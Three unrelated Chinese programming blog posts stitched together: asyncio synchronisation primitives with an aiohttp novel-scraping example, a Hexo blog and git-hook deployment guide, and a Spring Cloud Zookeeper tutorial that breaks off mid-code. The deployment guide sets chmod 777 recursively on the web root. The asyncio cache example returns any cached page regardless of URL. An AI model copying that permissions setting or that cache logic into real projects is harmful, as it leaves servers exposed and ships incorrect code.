    start_time = time.time()

    asyncio.run(main())

    print(f"time:{time.time()-start_time}")
输出：
start submit...
end submit...
-1411610
time:5.0279998779296875
2.为什么需要同步机制？¶
咋一看，单线程不用管线程安全啥的啊，要啥同步机制？其实在业务场景里面还是会出现诸如重复请求的情况，这个时候就需要一个同步机制了：

import asyncio

# 用来存放页面缓存
cache_dict = {}

# 模拟一个获取html的过程
async def fetch(url):
    # 每次网络访问，时间其实不确定的
    import random
    time = random.randint(2, 5)
    print(time)

    await asyncio.sleep(time)
    return f"<h2>{url}</h2>"

async def get_html(url):
    # 如果缓存存在，则返回缓存的页面
    for url in cache_dict:
        return cache_dict[url]
    # 否则获取页面源码并缓存
    html = await fetch(url)
    cache_dict[url] = html
    return html

async def parse_js(url):
    html = await get_html(url)
    # do somthing
    return len(html)

async def parse_html(url):
    html = await get_html(url)
    # do somthing
    return html

async def main():
    # 提交两个Task任务
    task1 = asyncio.create_task(parse_js("www.baidu.com"))
    task2 = asyncio.create_task(parse_html("www.baidu.com"))
    # 等待任务结束
    result_list = await asyncio.gather(task1, task2)
    print(result_list)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：(fetch方法访问了两次 ==> 两次网络请求)
2
3
[22, '<h2>www.baidu.com</h2>']
3.0100157260894775
简单说明：baidu.com一开始没缓存，那当解析js和解析html的任务提交时，就会进行两次网络请求（网络IO比较耗时），这样更容易触发反爬虫机制
3.Lock（互斥锁）¶
线程相关的Lock复习：https://www.cnblogs.com/dotnetcrazy/p/9528315.html#2.2.1.线程同步~互斥锁Lock
协程是线程安全的，那么这个Lock肯定是和多线程/进程里面的Lock是不一样的，我们先看一下提炼版的源码：

class Lock(_ContextManagerMixin):
    def __init__(self, *, loop=None):
        self._waiters = collections.deque()
        self._locked = False
        if loop is not None:
            self._loop = loop
        else:
            self._loop = events.get_event_loop()

    async def acquire(self):
        if not self._locked:
            self._locked = True  # 改变标识
        ...
        return self._locked

    def release(self):
        if self._locked:
            self._locked = False
        ...


PS：源码看完秒懂了，asyncio里面的lock其实就是一个标识而已
修改一下上面的例子：

import asyncio

# 用来存放页面缓存
cache_dict = {}
lock = None  # 你可以试试在这边直接写`asyncio.Lock()`

# 模拟一个获取html的过程
async def fetch(url):
    # 每次网络访问，时间其实不确定的
    import random
    time = random.randint(2, 5)
    print(time)

    await asyncio.sleep(time)
    return f"<h2>{url}</h2>"


async def get_html(url):
    async with lock:
        # 如果缓存存在，则返回缓存的页面
        for url in cache_dict:
            return cache_dict[url]
        # 否则获取页面源码并缓存
        html = await fetch(url)
        cache_dict[url] = html
        return html

async def parse_js(url):
    html = await get_html(url)
    # do somthing
    return len(html)

async def parse_html(url):
    html = await get_html(url)
    # do somthing
    return html

async def main():
    global lock
    lock = asyncio.Lock()  # 如果在开头就定义，那么lock的loop和方法的loop就会不一致了

    # 提交两个Task任务
    task1 = asyncio.create_task(parse_js("www.baidu.com"))
    task2 = asyncio.create_task(parse_html("www.baidu.com"))
    # 等待任务结束
    result_list = await asyncio.gather(task1, task2)
    print(result_list)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出:(fetch方法访问了1次 ==> 1次网络请求)
3
[22, '<h2>www.baidu.com</h2>']
3.0020127296447754
4.Semaphore（信号量）¶
线程篇Semaphore：https://www.cnblogs.com/dotnetcrazy/p/9528315.html#2.2.5.线程同步~信号量Semaphore(互斥锁的高级版)
这个用的比较多，简单回顾下之前讲的概念案例：
通俗讲就是：在互斥锁的基础上封装了下，实现一定程度的并行
举个例子，以前使用互斥锁的时候：（厕所就一个坑位，必须等里面的人出来才能让另一个人上厕所）

使用信号量Semaphore之后：厕所坑位增加到5个（自己指定），这样可以5个人一起上厕所了==> 实现了一定程度的并发控制
先看下缩略的源码：（可以这么想：内部维护了一个引用计数，每次来个任务就-1，一个任务结束计数就+1）

class Semaphore(_ContextManagerMixin):
    def __init__(self, value=1, *, loop=None):
        if value < 0:
            raise ValueError("Semaphore initial value must be >= 0")
        self._value = value
        self._waiters = collections.deque()
        if loop is not None:
            self._loop = loop
        else:
            self._loop = events.get_event_loop()

    async def acquire(self):
        while self._value <= 0:
            fut = self._loop.create_future()
            self._waiters.append(fut) # 把当前任务放入Queue中
            try:
                await fut # 等待一个任务的完成再继续
            except:
                fut.cancel() # 任务取消
                if self._value > 0 and not fut.cancelled():
                    self._wake_up_next() # 唤醒下一个任务
                raise
        self._value -= 1 # 用掉一个并发量
        return True

    def release(self):
        self._value += 1 # 恢复一个并发量
        self._wake_up_next() # 唤醒下一个任务


现在举个常见的场景：比如调用某个免费的api，该api限制并发数为5

import asyncio

sem = None

# 模拟api请求
async def api_test(i):
    async with sem:
        await asyncio.sleep(1)
        print(f"The Task {i} is done")

async def main():
    global sem
    sem = asyncio.Semaphore(5)  # 设置并发数为5
    tasks = [asyncio.create_task(api_test(i)) for i in range(20)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


动态输出： 
PS：BoundedSemaphore是Semaphore的一个版本，在调用release()时检查计数器的值是否超过了计数器的初始值，如果超过了就抛出一个异常
5.Event（事件）¶
线程篇Event：https://www.cnblogs.com/dotnetcrazy/p/9528315.html#2.2.8.线程同步~Event
之前讲的很详细了，举个爬虫批量更新的例子就一笔带过：

import asyncio

event = None
html_dict = {}

async def updates():
    # event.wait()是协程方法，需要await
    await event.wait()
    # 入库操作省略 html_dict >> DB
    return "html_dict >> DB done"

async def get_html(url):
    # 摸拟网络请求
    await asyncio.sleep(2)
    html_dict[url] = f"<h1>{url}</h1>" # 可以暂时写入临时文件中

    event.set()  # 标记完成，普通方法
    return f"{url} done"

async def main():
    global event
    event = asyncio.Event()  # 初始化 event 对象

    # 创建批量任务
    tasks = [
        asyncio.create_task(get_html(f"www.mmd.com/a/{i}"))
        for i in range(1, 10)
    ]
    # 批量更新操作
    tasks.append(asyncio.create_task(updates()))

    result = await asyncio.gather(*tasks)
    print(result)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
['www.mmd.com/a/1 done', 'www.mmd.com/a/2 done', 'www.mmd.com/a/3 done', 'www.mmd.com/a/4 done', 'www.mmd.com/a/5 done', 'www.mmd.com/a/6 done', 'www.mmd.com/a/7 done', 'www.mmd.com/a/8 done', 'www.mmd.com/a/9 done', 'html_dict >> DB done']
2.0012683868408203
跟之前基本上一样，就一个地方不太一样：async def wait(self)，wait方法现在是协程方法了，使用的时候需要await

coroutine wait()

等待事件内部标志被设置为True
如果事件的内部内部标志已设置，则立即返回True。否则，一直阻塞，直到另外的任务调用set()


set()

设置事件内部标志为True
所有等待事件的任务将会立即被触发


clear()

清除事件内部标志（即重置为False）
等待事件的任务将会阻塞，直到set()方法被再次调用


is_set()

如果事件内部标志被设置为True，则返回True



6.Condition（条件变量）¶
线程篇Condition：https://www.cnblogs.com/dotnetcrazy/p/9528315.html#2.2.4.线程同步~条件变量Condition
先简单看看方法列表：

coroutine acquire()：

获取底层锁。该方法一直等待，直到底层锁处于未锁定状态，然后设置其为锁定状态，并且返回True


notify(n=1)：

唤醒至多n个等待条件的任务。如果没有正在等待的任务，则该方法无操作。
在调用该方法之前，必须先调用acquire()获取锁，并在调用该方法之后释放锁。
如果在锁为锁定的情况下调用此方法，会引发RuntimeError异常。


locked()：

如果底层锁已获取，则返回True。


notify_all()：

唤醒所有正在等待该条件的任务。该方法与notify()类似，区别只在它会唤醒所有正在等待的任务。


release()：

释放底层锁。在未锁定的锁上调用时，会引发RuntimeError异常。


coroutine wait()：

等待通知。如果调用此方法的任务没有获取到锁，则引发RuntimeError异常。
此方法释放底层锁，然后保持阻塞，直至被notify()或notify_all()唤醒。被唤醒之后，条件对象重新申请锁，该方法返回True。


coroutine wait_for(predicate)

等待predicate变为True。predicate必须可调用，它的执行结果会被解释为布尔值，并作为最终结果返回。



PS：Condition结合了Event和Lock的功能(也可以使多个Condition对象共享一个Lock，允许不同任务之间协调对共享资源的独占访问)
看个生产消费者的案例：

import asyncio

cond = None
p_list = []

# 生产者
async def producer(n):
    for i in range(5):
        async with cond:
            p_list.append(f"{n}-{i}")
            print(f"[生产者{n}]生产商品{n}-{i}")
            # 通知任意一个消费者
            cond.notify()  # 通知全部消费者：cond.notify_all()
        # 摸拟一个耗时操作
        await asyncio.sleep(0.01)

# 消费者
async def consumer(i):
    while True:
        async with cond:
            if p_list:
                print(f"列表商品：{p_list}")
                name = p_list.pop()  # 消费商品
                print(f"[消费者{i}]消费商品{name}")
                print(f"列表剩余：{p_list}")

                # 摸拟一个耗时操作
                await asyncio.sleep(0.01)
            else:
                await cond.wait()

async def main():
    global cond
    cond = asyncio.Condition()  # 初始化condition
    p_tasks = [asyncio.create_task(producer(i)) for i in range(2)]  # 两个生产者
    c_tasks = [asyncio.create_task(consumer(i)) for i in range(5)]  # 五个消费者
    await asyncio.gather(*p_tasks, *c_tasks)

if __name__ == "__main__":
    asyncio.run(main())


输出：
[生产者0]生产商品0-0
[生产者1]生产商品1-0
列表商品：['0-0', '1-0']
[消费者0]消费商品1-0
列表剩余：['0-0']
列表商品：['0-0']
[消费者1]消费商品0-0
列表剩余：[]
[生产者0]生产商品0-1
[生产者1]生产商品1-1
列表商品：['0-1', '1-1']
[消费者0]消费商品1-1
列表剩余：['0-1']
列表商品：['0-1']
[消费者1]消费商品0-1
列表剩余：[]
[生产者0]生产商品0-2
[生产者1]生产商品1-2
列表商品：['0-2', '1-2']
[消费者0]消费商品1-2
列表剩余：['0-2']
列表商品：['0-2']
[消费者1]消费商品0-2
列表剩余：[]
[生产者0]生产商品0-3
[生产者1]生产商品1-3
列表商品：['0-3', '1-3']
[消费者0]消费商品1-3
列表剩余：['0-3']
列表商品：['0-3']
[消费者1]消费商品0-3
列表剩余：[]
[生产者0]生产商品0-4
[生产者1]生产商品1-4
列表商品：['0-4', '1-4']
[消费者0]消费商品1-4
列表剩余：['0-4']
列表商品：['0-4']
[消费者1]消费商品0-4
列表剩余：[]
PS：第七条的简单说明：（来看看wait_for方法的源码）

# 一直等到函数返回true（从返回结果来说：要么一直阻塞，要么返回true）
async def wait_for(self, predicate):
    result = predicate()
    # 如果不是返回true就继续等待
    while not result:
        await self.wait()
        result = predicate()
    return result


课后拓展：async_timeout（兼容async的超时的上下文管理器） https://github.com/lotapp/BaseCode/blob/master/python/5.concurrent/ZCoroutine/async_timeout_timeout.py
7.Queue（队列）¶
官方文档：https://docs.python.org/3/library/asyncio-queue.html
线程篇Queue：https://www.cnblogs.com/dotnetcrazy/p/9528315.html#2.2.6.线程同步~Queue-引入
其实你不考虑限流的情况下，协程里面的queue和list基本上差不多（ps：asyncio.Queue(num)可以指定数量）
举个经典的生产消费者案例：

import random
import asyncio

async def producer(q, i):
    for i in range(5):
        num = random.random()
        await q.put(num)
        print(f"[生产者{i}]商品{num}出厂了")
        await asyncio.sleep(num)

async def consumer(q, i):
    while True:
        data = await q.get()
        print(f"[消费者{i}]商品{data}抢光了")

async def main():
    queue = asyncio.Queue(10)  # 为了演示，我这边限制一下

    p_tasks = [asyncio.create_task(producer(queue, i)) for i in range(2)]  # 两个生产者
    c_tasks = [asyncio.create_task(consumer(queue, i)) for i in range(5)]  # 五个消费者
    await asyncio.gather(*p_tasks, *c_tasks)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：（注意一下get和put方法都是协程方法即可）
[生产者0]商品0.20252203397767787出厂了
[生产者0]商品0.9641503458079388出厂了
[消费者0]商品0.20252203397767787抢光了
[消费者0]商品0.9641503458079388抢光了
[生产者1]商品0.8049655468032324出厂了
[消费者0]商品0.8049655468032324抢光了
[生产者1]商品0.6032743557097342出厂了
[消费者1]商品0.6032743557097342抢光了
[生产者2]商品0.08818326334746773出厂了
[消费者2]商品0.08818326334746773抢光了
[生产者3]商品0.3747289313977561出厂了
[消费者3]商品0.3747289313977561抢光了
[生产者4]商品0.3948823110071299出厂了
[消费者4]商品0.3948823110071299抢光了
[生产者2]商品0.5775767044660681出厂了
[消费者0]商品0.5775767044660681抢光了
[生产者3]商品0.500537752889471出厂了
[消费者1]商品0.500537752889471抢光了
[生产者4]商品0.9921528527523727出厂了
[消费者2]商品0.9921528527523727抢光了
PS：协程也提供了Priority Queue优先级队列 and LifoQueue后进先出队列，这边就不再啰嗦了(前面我们画图演示并手动实现过)
课后拓展：https://docs.python.org/3/library/asyncio-queue.html#examples
扩展：Subprocesses¶
官方文档：https://docs.python.org/3/library/asyncio-subprocess.html
这个之前进程篇的时候说过，不是我们今天的重点，我贴一个官方demo：

import asyncio

async def run(cmd):
    proc = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE)

    stdout, stderr = await proc.communicate()

    print(f'[{cmd!r} exited with {proc.returncode}]')
    if stdout:
        print(f'[stdout]\n{stdout.decode()}')
    if stderr:
        print(f'[stderr]\n{stderr.decode()}')

asyncio.run(run('ls /zzz'))


输出：
['ls /zzz' exited with 1]
[stderr]
ls: /zzz: No such file or directory
下节预告：asyncio+aiohttp版爬虫




 


4.aiohttp¶
代码：https://github.com/lotapp/BaseCode/tree/master/python/5.concurrent/ZCoroutine/z_spider
asyncio库只有TCP和UDP服务，并不支持HTTP，aiohttp就可以理解为是基于asyncio的http服务
4.1.入门案例¶
先来个获取页面html的demo：

import asyncio
import aiohttp

error_urls = set()

# 获取页面html
async def fetch(session, url):
    async with session.get(url) as response:
        if response.status == 200:
            return await response.text()
        else:
            error_urls.add(url)  # 添加到待处理集合中

async def main():
    async with aiohttp.ClientSession() as session:
        html = await fetch(session, "http://www.biquge.cm/12/12097/")
        if html:  # 获取到html
            print(len(html))

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
24287
0.5429983139038086
4.2.html解析¶
推荐一款轻量级网页解析库：pyquery（一个类似jquery的python库）
4.2.1.列表页¶
在上面基础上简单提取：（pq.items("dd a") ==> 类比JQ选择器）

import asyncio
import aiohttp
from pyquery import PyQuery

error_urls = set()

# 获取页面html
async def fetch(session, url):
    async with session.get(url) as response:
        if response.status == 200:
            return await response.text()
        else:
            error_urls.add(url)  # 待处理的url集合

# 阻塞方法
def saves(results):
    with open("www.biquge.cm.txt", "a+", encoding="utf-8") as fs:
        fs.writelines(results)
        print("ok")

async def main():
    async with aiohttp.ClientSession() as session:
        html = await fetch(session, "http://www.biquge.cm/12/12097/")
        pq = PyQuery(html)

        results = [
            item.text() + ":" + item.attr("href") + "\n"
            for item in pq.items("dd a")
        ]
        # print(pq("dd a").text())

        # 兼容阻塞旧代码
        await asyncio.get_running_loop().run_in_executor(None, saves, results)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：www.biquge.cm.txt
新书的一些话:/12/12097/7563947.html
第一章论坛里的鬼故事。:/12/12097/7563949.html
第二章临时讲课:/12/12097/7563950.html
第三章鬼域。:/12/12097/7563951.html
第四章恐怖敲门鬼:/12/12097/7565568.html
第五章迷路:/12/12097/7565569.html
第六章厕所中的手:/12/12097/7565570.html
第七章身后的脚步:/12/12097/7565571.html
第八章奇怪的树:/12/12097/7565572.html
第九章鬼婴:/12/12097/7565573.html
第十章恶鬼之力:/12/12097/7565574.html
...
第三百二十七章三口箱子:/12/12097/7950281.html
第三百二十八章鬼橱里的照片:/12/12097/7952145.html
第三百二十九章中山市事件:/12/12097/7955244.html
第三百三十章两条信息:/12/12097/7956401.html
第三百三十一章进入中山市:/12/12097/7959077.html
第三百三十二章出乎意料:/12/12097/7962119.html
第三百三十四章酒店的二楼:/12/12097/7964192.html
第三百三十五章黑色的烛火:/12/12097/7969058.html
第三百三十六章微笑的尸体:/12/12097/7973826.html
4.2.2.详情页¶
获取一个详情页看看：

import asyncio
import aiohttp
from pyquery import PyQuery

error_urls = set()

# 获取页面html
async def fetch(session, url):
    async with session.get(url) as response:
        if response.status == 200:
            return await response.text()
        else:
            error_urls.add(url)  # 待处理的url集合

# 详情页获取测试
async def main():
    async with aiohttp.ClientSession() as session:
        html = await fetch(session,
                           "http://www.biquge.cm//12/12097/7563949.html")
        pq = PyQuery(html)
        print(pq("#content").text())
        # results = [item.text() for item in pq.items("#content")]
        # print(results)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
老夫掐指一算，你现在正在床上看小说，而且还是侧身，搞不好手机还在充电。

正在读高三的杨间此刻正躺在被窝里无聊的翻看着手机，他随手点开了一个帖子，下面有不少网友在回帖。

“卧槽，楼主真乃神人也，这都被楼主猜中了。”

“呵，你会告诉你们我现在正在厕所蹲坑么？不用问了，脚麻了。”

......

0.6684205532073975
PS：Win下Py包安装出错就去这个网站下对应包 https://www.lfd.uci.edu/~gohlke/pythonlibs/
4.3.爬虫小案例¶
4.3.1.小说网站实战¶
限流以及反爬虫和如何应对反爬虫机制，后面我们会继续说，这边简单举个小说离线的例子：

import asyncio
import aiohttp
from pyquery import PyQuery

sem = None
error_urls = set()

# 获取html
async def fetch(session, url):
    async with sem:
        async with session.get(url) as response:
            if response.status == 200:
                # aiohttp遇到非法字符的处理
                return await response.text("gbk", "ignore")  # 忽略非法字符
            else:
                error_urls.add(url)  # 待处理的url集合

# 获取文章正文
async def get_text(session, url):
    # 把相对路径改成域名+路径
    if not url.startswith("http://www.biquge.cm"):
        url = "http://www.biquge.cm" + url
    html = await fetch(session, url)
    pq = PyQuery(html)
    return pq("#content").text()

# 普通阻塞方法
def save(title, text):
    with open("恐怖复苏.md", "a+", encoding="gbk") as fs:
        fs.write(f"## {title}\n\n{text}\n\n")
        print(f"{title} done...")

async def main():
    global sem
    sem = asyncio.Semaphore(3) # 控制并发数反而更快
    loop = asyncio.get_running_loop()

    async with aiohttp.ClientSession() as session:
        html = await fetch(session, "http://www.biquge.cm/12/12097/")
        pq = PyQuery(html)
        for item in pq.items("dd a"):
            title = item.text()
            text = await get_text(session, item.attr("href"))
            # 兼容阻塞旧代码
            await loop.run_in_executor(None, save, title, text)
    print("task over")


if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：（爬取整站就不用我说了吧：提取a标签中的src，url去重后爬取内容）
新书的一些话 done...
第一章论坛里的鬼故事。 done...
第二章临时讲课 done...
第三章鬼域。 done...
第四章恐怖敲门鬼 done...
第五章迷路 done...
第六章厕所中的手 done...
第七章身后的脚步 done...
第八章奇怪的树 done...
第九章鬼婴 done...
第十章恶鬼之力 done...
第十一章逐渐复苏 done...
第十二章宛如智障 done...
第十三章羊皮纸 done...
第十四章诡异的纸 done...
......
第三百二十八章鬼橱里的照片 done...
第三百二十九章中山市事件 done...
第三百三十章两条信息 done...
第三百三十一章进入中山市 done...
第三百三十二章出乎意料 done...
第三百三十四章酒店的二楼 done...
第三百三十五章黑色的烛火 done...
第三百三十六章微笑的尸体 done...
task over
动态展示： 
闲言碎语¶
【推荐】Python高性能异步框架：https://github.com/LessChina/sanic
逆天点评：（只看主线，只说我的见识）

原来大家都是使用大一统的Django（方便）
后来因为性能不佳，FaceBook开发了Tornado（IO多路复用）来代替
再后来时代主流是敏捷开发，于是就有了Flask（简单）
后来Node和Go火了，NetCore也出山了，Python的Flask等同步框架总是被吊打
于是被逼出了Japronto，瞬间惊艳和吊打的所有开发语言，但是只是冒了泡就不怎么维护了
后来就是AI爆发时期，Python直接打上了AI的标签了，而Web也逐渐被打上了初创公司的标配
之后官方看不下去了，自己搞了一套异步框架asyncioandaiohttp（Node兄弟这么优秀，凭啥我们不行）
民间看不下去了来了个asyncio替代品uvloop（C实现的程度比官方多(谁多谁高效)，PS：官方用法太丑陋了3.7才给足了语法糖）
解决方案虽然各种出，但是web框架不行啊，于是又冒了个主流sanic（语法和Flask很像，性能不亚于Japronto）
现在又刚冒出vibora（都是C实现）有超过sanic的趋势（PS：等过几个版本再试水，不过现在很多开发者都是Go + Python了)

最后BB一句：

gevent用猴子补丁的确很方便，但很多内部异常就被屏蔽了，而且性能现在不是最高
tornado为了兼容py2和py3，内部还是通过生成器来实现异步的，效率相对低点
asyncio是未来的主流方向，sanic是目前最火的异步框架（vibora还在观察中）

PS：Django、Flask是阻塞式IO，web框架一般不会直接部署（它自带的解决方案只是方便调试），一般使用uwsgi or gunicorn + nginx来部署（tornado可以直接部署）
参考链接：
python异步编程之asyncio
https://www.cnblogs.com/shenh/p/9090586.html

uWSGI, Gunicorn, 啥玩意儿?
https://www.cnblogs.com/gdkl/p/6807667.html

asyncio异步IO中文翻译：
http://www.cnblogs.com/mamingqian/p/10008279.html
https://www.cnblogs.com/mamingqian/p/10075444.html
https://www.cnblogs.com/mamingqian/p/10044730.html

PyQuery基础：
https://www.cnblogs.com/zhaof/p/6935473.html
https://www.cnblogs.com/lei0213/p/7676254.html



********************************************************************************************************************************************************************************************************
教你10分钟搭建酷炫的个人博客
以个人博客为例，博客地址
准备工作
安装
$ npm install -g hexo-cli
初始化
$ hexo init <folder>
$ cd <folder>
$ npm install
创建新文章
$ hexo new "My New Post"
运行开发环境
$ hexo server
$ hexo s
构建
$ hexo generate
$ hexo g
部署
$ hexo deploy
$ hexo d
详细准备工作，可以查阅hexo官网
安装主题cactus，一个很程序员的主题，推荐！
克隆仓库，并且将源文件复制到博客项目中themes目录下
git clone https://github.com/probberechts/hexo-theme-cactus.git themes/cactus

themes/cactus/_config.yml相关配置,详细解释可以看官方文档
# 首页Projects的url
projects_url: https://github.com/xiaobinwu
# 设置页面方向
direction: ltr
# 首页导航
# $ hexo new page about，可以创建page页面
nav:
  home: /
  about: /about/
  articles: /archives/
  categories: /categories/
  search: /search/
# 社交链接
social_links:
  github: https://github.com/xiaobinwu
  mail: mailto:xiaobin_wu@yahoo.com
# 开启标签快捷方式
tags_overview: true
# 首页 Writing的展示条数
posts_overview:
  show_all_posts: false
  post_count: 5
  sort_updated: false
# 排列方式
archive:
  sort_updated: false
post:
  show_updated: false
# logo设置
logo:
  enabled: true
  width: 50
  height: 50
  url: /images/logo.png
  gravatar: false
# ico设置
favicon:
  desktop:
    url: /images/favicon.ico
    gravatar: false
  android:
    url: /images/favicon-192x192.png
    gravatar: false
  apple:
    url: /images/apple-touch-icon.png
    gravatar: false
# 高亮语法
highlight: kimbie.dark
# 博客主题色，dark, light, classic, white
colorscheme: dark
page_width: 48
# rss设置
rss: atom.xml
open_graph:
  fb_app_id:
  fb_admins:
  twitter_id:
  google_plus:
# disqus评论，默认不开启，需FQ
disqus:
  enabled: false
  shortname: cactus-1
# 谷歌统计
google_analytics:
  enabled: false
  id: UA-86660611-1
# 百度统计
baidu_analytics:
  enabled: false
  id: 2e6da3c375c8a87f5b664cea6d4cb29c

gravatar:
  email: xiaobin_wu@yahoo.com

valine:
  enable: true
  app_id: xxxxxx
  app_key: xxxxxxx
Valine评论系统
themes/cactus/_config.yml配置Valine，需要申请app_id，app_key
valine:
  enable: true
  app_id: xxxx
  app_key: xxxx
themes/cactus/layout/_partial/comments.ejs,写入
<% if(theme.valine.enable) { %>
    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments" class="blog-post-comments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            visitor: true,
            appId: '<%=theme.valine.app_id %>',
            appKey: '<%=theme.valine.app_key %>',
            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
            avatar: 'robohash'
        })
    </script>
<% } %>
自动部署hexo博客到阿里云服务器
创建仓库(远端服务器创建git仓库),可以使用ssh登入云服务器
mkdir blog.git && cd blog.git
git init --bare
Hexo配置
deploy:
  type: git
  message: update
  repo: root@xx.xxx.xx.xxx:/www/wwwroot/blog.git,master
插件安装
npm install hexo-deployer-git --save
自动部署
进入到git仓库hooks目录，并创建钩子post-receive
cd /www/wwwroot/blog.git/hooks
touch post-receive
vim post-receive
输入下面脚本：
#!/bin/bash -l
GIT_REPO=/www/wwwroot/blog.git
TMP_GIT_CLONE=/www/wwwroot/tmp/blog
PUBLIC_WWW=/www/wwwroot/blog
rm -rf ${TMP_GIT_CLONE}
mkdir ${TMP_GIT_CLONE}
git clone $GIT_REPO $TMP_GIT_CLONE
rm -rf ${PUBLIC_WWW}/*
cp -rf ${TMP_GIT_CLONE}/* ${PUBLIC_WWW}
更改权限
chmod +x post-receive
chmod 777 -R /www/wwwroot/blog
chmod 777 -R /www/wwwroot/tmp/blog
最后部署
$ hexo g -d

********************************************************************************************************************************************************************************************************
zookeeper服务发现实战及原理--spring-cloud-zookeeper源码分析
1.为什么要服务发现？
服务实例的网络位置都是动态分配的。由于扩展、失败和升级，服务实例会经常动态改变，因此，客户端代码需要使用更加复杂的服务发现机制。
2.常见的服务发现开源组件
etcd—用于共享配置和服务发现的高可用性、分布式、一致的键值存储。使用etcd的两个著名项目是Kubernetes和Cloud Foundry。consul-发现和配置服务的工具。它提供了一个API，允许客户端注册和发现服务。领事可以执行健康检查，以确定服务的可用性。Apache Zookeeper——一个广泛使用的分布式应用高性能协调服务。Apache Zookeeper最初是Hadoop的子项目，但现在是顶级项目。

 
3.zookeeper服务发现原理
  3.1 zookeeper是什么？  
　　ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。
 3.2 为什么zookeeper？
　　大部分分布式应用需要一个主控、协调器或控制器来管理物理分布的子进程（如资源、任务分配等）　　目前，大部分应用需要开发私有的协调程序，缺乏一个通用的机制　　协调程序的反复编写浪费，且难以形成通用、伸缩性好的协调器　　ZooKeeper：提供通用的分布式锁服务，用以协调分布式应用（如为HBase提供服务）
  3.3 Zookeeper在微服务框架中可以实现服务发现，该服务发现机制可作为云服务的注册中心。
　　通过Spring Cloud Zookeeper为应用程序提供一种Spring Boot集成，将Zookeeper通过自动配置和绑定 的方式集成到Spring环境中.
4.准备工作
安装zookeeper和zooinspector见
window7环境下ZooKeeper的安装运行及监控查看
　　此次安装的zookeeper版本为最新版
　　zookeeper-3.5.4-beta 安装过程一样
　　下载ZooInspector，参照指南运行java -Dfile.encoding=UTF-8 -jar zookeeper-dev-ZooInspector.jar即可
5.实战
  5.1 使用sts创建一个spring starter project名称为zk-discovery，如下图所示

此时自动生成的pom.xml的配置文件如下所示

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.1.3.RELEASE</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>zk-discovery</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>zk-discovery</name>
    <description>Demo project for Spring Boot</description>

    <properties>
        <java.version>1.8</java.version>
        <spring-cloud.version>Greenwich.SR1</spring-cloud.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-starter-zookeeper-discovery</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <dependencyManagement>
        <dependencies>
            <dependency>
                <groupId>org.springframework.cloud</groupId>
                <artifactId>spring-cloud-dependencies</artifactId>
                <version>${spring-cloud.version}</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>
        </dependencies>
    </dependencyManagement>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

    <repositories>
        <repository>
            <id>spring-milestones</id>
            <name>Spring Milestones</name>
            <url>https://repo.spring.io/milestone</url>
        </repository>
    </repositories>

</project>

 
5.2 ZkDiscoveryApplication增加服务发现注解@EnableDiscoveryClient

package com.example.demo;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.cloud.client.discovery.EnableDiscoveryClient;

@SpringBootApplication
@EnableDiscoveryClient
public class ZkDiscoveryApplication {
    public static void main(String[] args) {
        SpringApplication.run(ZkDiscoveryApplication.class, args);
    }

}

 5.3 增加Rest服务HelloWorldController.java

package com.example.demo;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HelloWorldController {
    @GetMapping("/helloworld")
    public String HelloWorld() {
        return "Hello World!";
    }
}

5.4. 属性文件配置

spring:
  application:
    name: HelloWorld
  cloud:
    zookeeper:
      connect-string: localhost:2181
      discovery:
        enabled: true
server:
  port: 8081
logging:
  level:
    org.apache.zookeeper.ClientCnxn: WARN

6.源码分析
 以spring-boot app项目启动时注册服务ZookeeperAutoServiceRegistrationAutoConfiguration.java为入口

    @Bean
    @ConditionalOnMissingBean(ZookeeperRegistration.class)
    public ServiceInstanceRegistration serviceInstanceRegistration(
            ApplicationContext context, ZookeeperDiscoveryProperties properties) {
        String appName = context.getEnvironment().getProperty("spring.application.name",
                "application");
        String host = properties.getInstanceHost();
        if (!StringUtils.hasText(host)) {
